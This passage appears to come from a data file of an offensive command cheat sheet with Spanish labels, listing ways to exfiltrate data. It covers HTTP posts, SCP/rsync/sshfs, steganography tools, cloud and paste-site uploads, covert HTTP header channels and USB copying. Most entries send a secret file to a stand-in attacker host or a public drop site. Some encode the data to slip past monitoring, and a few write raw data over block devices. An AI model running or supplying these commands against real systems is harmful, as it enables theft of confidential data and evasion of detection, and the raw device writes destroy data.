    "cmd": "printf 'HTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -lvnp 80",
    "desc": "HTTP reply"
   },
   {
    "cmd": "php -S 0.0.0.0:80 -t /tmp/web",
    "desc": "PHP server"
   },
   {
    "cmd": "python3 -m http.server 80",
    "desc": "Python server"
   },
   {
    "cmd": "ncat -lvnp 80 --keep-open",
    "desc": "Ncat"
   },
   {
    "cmd": "wget --post-file=/tmp/secret http://attacker.com/",
    "desc": "Wget post"
   },
   {
    "cmd": "curl -s http://attacker.com/$(cat /tmp/secret | xxd -p)",
    "desc": "Hex URL"
   },
   {
    "cmd": "python3 -c 'import requests; requests.post(\"http://attacker.com/c\", data=open(\"/tmp/s\").read())'",
    "desc": "Requests"
   }
  ]
 },
 {
  "tool": "ssh-exfil",
  "desc": "Exfiltración vía SSH/SCP",
  "commands": [
   {
    "cmd": "scp /tmp/secret user@attacker:/tmp/",
    "desc": "SCP"
   },
   {
    "cmd": "scp -P 2222 /tmp/secret user@attacker:/tmp/",
    "desc": "Puerto custom"
   },
   {
    "cmd": "scp -i key /tmp/secret user@attacker:/tmp/",
    "desc": "Con clave"
   },
   {
    "cmd": "sftp user@attacker",
    "desc": "SFTP"
   },
   {
    "cmd": "sftp> put /tmp/secret",
    "desc": "SFTP put"
   },
   {
    "cmd": "sftp> mput /tmp/*.tar.gz",
    "desc": "Multi put"
   },
   {
    "cmd": "rsync -avz /tmp/secret user@attacker:/tmp/",
    "desc": "Rsync"
   },
   {
    "cmd": "rsync -e 'ssh -p 2222' /tmp/secret user@attacker:/tmp/",
    "desc": "Rsync puerto"
   },
   {
    "cmd": "tar czf - /tmp/secret | ssh user@attacker 'cat > /tmp/out.tgz'",
    "desc": "Tar pipe ssh"
   },
   {
    "cmd": "ssh user@attacker 'cat > /tmp/x' < /tmp/secret",
    "desc": "Cat pipe"
   },
   {
    "cmd": "sshfs user@attacker:/tmp /mnt",
    "desc": "SSHFS"
   },
   {
    "cmd": "cp /tmp/secret /mnt/",
    "desc": "Copiar montado"
   }
  ]
 },
 {
  "tool": "steganography-exfil",
  "desc": "Esteganografía para exfiltración",
  "commands": [
   {
    "cmd": "steghide embed -cf image.jpg -ef secret.txt -p pass",
    "desc": "Embed"
   },
   {
    "cmd": "steghide extract -sf image.jpg -p pass",
    "desc": "Extract"
   },
   {
    "cmd": "steghide info image.jpg",
    "desc": "Info"
   },
   {
    "cmd": "steghide --covers image.jpg -ef secret.txt",
    "desc": "Cover"
   },
   {
    "cmd": "outguess -k pass -d secret.txt image.jpg out.jpg",
    "desc": "Outguess embed"
   },
   {
    "cmd": "outguess -k pass -r out.jpg secret.txt",
    "desc": "Outguess extract"
   },
   {
    "cmd": "steghide embed -cf image.jpg -ef secret.txt -z 9",
    "desc": "Compresión 9"
   },
   {
    "cmd": "steghide embed -cf image.jpg -ef secret.txt -e none",
    "desc": "Sin cifrado"
   },
   {
    "cmd": "zsteg image.png",
    "desc": "Zsteg"
   },
   {
    "cmd": "zsteg -a image.png",
    "desc": "Todo"
   },
   {
    "cmd": "zsteg -E '1b,lsb,xy' image.png",
    "desc": "Extraer plano"
   },
   {
    "cmd": "stegsnow -C -p pass message.txt snow.txt",
    "desc": "Snow whitespace"
   },
   {
    "cmd": "stegsnow -C -p pass snow.txt",
    "desc": "De-snow"
   },
   {
    "cmd": "convert image.png -stegano 0 out.png",
    "desc": "Imagemagick stego"
   },
   {
    "cmd": "stegsolve image.png",
    "desc": "GUI stegsolve"
   },
   {
    "cmd": "exiftool -comment='SECRET' image.jpg",
    "desc": "Metadatos"
   },
   {
    "cmd": "exiftool -Comment='' image.jpg",
    "desc": "Limpiar"
   }
  ]
 },
 {
  "tool": "cloud-exfil",
  "desc": "Exfiltración a servicios cloud",
  "commands": [
   {
    "cmd": "aws s3 cp /tmp/secret s3://bucket/",
    "desc": "S3 upload"
   },
   {
    "cmd": "aws s3 ls s3://bucket/",
    "desc": "Listar"
   },
   {
    "cmd": "aws s3 sync /tmp/ s3://bucket/",
    "desc": "Sync"
   },
   {
    "cmd": "aws s3 cp s3://bucket/secret /tmp/",
    "desc": "Descargar"
   },
   {
    "cmd": "gsutil cp /tmp/secret gs://bucket/",
    "desc": "GCS upload"
   },
   {
    "cmd": "gsutil ls gs://bucket/",
    "desc": "GCS list"
   },
   {
    "cmd": "azcopy copy /tmp/secret https://sa.blob.core.windows.net/c/ex",
    "desc": "Azure"
   },
   {
    "cmd": "az storage blob upload --account-name a -c c -n f --file /tmp/secret",
    "desc": "Az blob"
   },
   {
    "cmd": "curl -s -T /tmp/secret 'https://transfer.sh/secret'",
    "desc": "Transfer.sh"
   },
   {
    "cmd": "curl -s -T /tmp/secret 'https://tmpfiles.org/api/v1/upload'",
    "desc": "Tmpfiles"
   },
   {
    "cmd": "curl -s 'https://pastebin.com/api/api_post.php' -d 'api_dev_key=KEY' -d 'api_option=paste' -d 'api_paste_code=SECRET'",
    "desc": "Pastebin"
   },
   {
    "cmd": "curl -s -F 'file=@/tmp/secret' 'https://0x0.st'",
    "desc": "0x0.st"
   },
   {
    "cmd": "python3 -c 'import requests; print(requests.post(\"https://transfer.sh\", files={\"f\": open(\"/tmp/s\",\"rb\")}).text)'",
    "desc": "Py transfer"
   },
   {
    "cmd": "nc -lvnp 4444 | tee /tmp/received",
    "desc": "NC receive"
   },
   {
    "cmd": "ssh user@attacker 'cat > /tmp/x' < /tmp/secret",
    "desc": "SSH exfil"
   }
  ]
 },
 {
  "tool": "covert-http",
  "desc": "Canales HTTP encubiertos (stego en requests)",
  "commands": [
   {
    "cmd": "curl -s 'http://IP/?d=$(cat /tmp/s | base64 -w0)'",
    "desc": "Query b64"
   },
   {
    "cmd": "curl -s http://IP/ -H 'X-Data: SECRET'",
    "desc": "Header"
   },
   {
    "cmd": "curl -s -e 'http://objetivo.com/SECRET' http://IP/",
    "desc": "Referer"
   },
   {
    "cmd": "curl -s -A 'SECRET' http://IP/",
    "desc": "UA"
   },
   {
    "cmd": "printf 'GET / HTTP/1.1\\r\\nHost: IP\\r\\nCookie: d=SECRET\\r\\n\\r\\n' | nc IP 80",
    "desc": "Cookie raw"
   },
   {
    "cmd": "curl -s -H 'Accept: SECRET' http://IP/",
    "desc": "Accept"
   },
   {
    "cmd": "python3 -c 'import requests; requests.get(\"http://IP/\", params={\"d\": \"SECRET\"})'",
    "desc": "Py params"
   },
   {
    "cmd": "tcpdump -i eth0 port 80 -A | grep -a SECRET",
    "desc": "Ver canal"
   },
   {
    "cmd": "wget --header='X-Data: SECRET' http://IP/",
    "desc": "Wget header"
   },
   {
    "cmd": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"d\":\"SECRET\"}' http://IP/api",
    "desc": "JSON body"
   },
   {
    "cmd": "curl -s -o /dev/null -w '%{size_download}' http://IP/?d=SECRET",
    "desc": "Tamaño"
   },
   {
    "cmd": "nc -lvnp 80 | strings",
    "desc": "Capture"
   }
  ]
 },
 {
  "tool": "usb-exfil",
  "desc": "Exfiltración por USB (badusb, copia)",
  "commands": [
   {
    "cmd": "lsblk -o NAME,SIZE,MOUNTPOINT",
    "desc": "Ver USB"
   },
   {
    "cmd": "mkdir -p /mnt/usb && mount /dev/sdb1 /mnt/usb",
    "desc": "Montar"
   },
   {
    "cmd": "cp -r /tmp/secret /mnt/usb/",
    "desc": "Copiar"
   },
   {
    "cmd": "dd if=/dev/sda of=/tmp/disk.img bs=4M status=progress",
    "desc": "Imagen disco"
   },
   {
    "cmd": "dd if=/dev/sda bs=512 count=1 | xxd",
    "desc": "MBR"
   },
   {
    "cmd": "echo 'SECRET' > /dev/sdb",
    "desc": "Escribir raw"
   },
   {
    "cmd": "strings /dev/sdb | head",
    "desc": "Leer raw"
   },
   {
    "cmd": "dmesg | grep -i usb | tail",
    "desc": "Log USB"
   },
   {
    "cmd": "sync && umount /mnt/usb",
    "desc": "Desmontar"
   },
   {
    "cmd": "tar czf - /tmp/secret | tee /dev/sdb",
    "desc": "Tar a raw"
   },
   {
    "cmd": "testdisk /dev/sdb",
    "desc": "Testdisk"
   },
   {
    "cmd": "photorec /dev/sdb",
    "desc": "Recuperar"
   }
  ]
 }
];
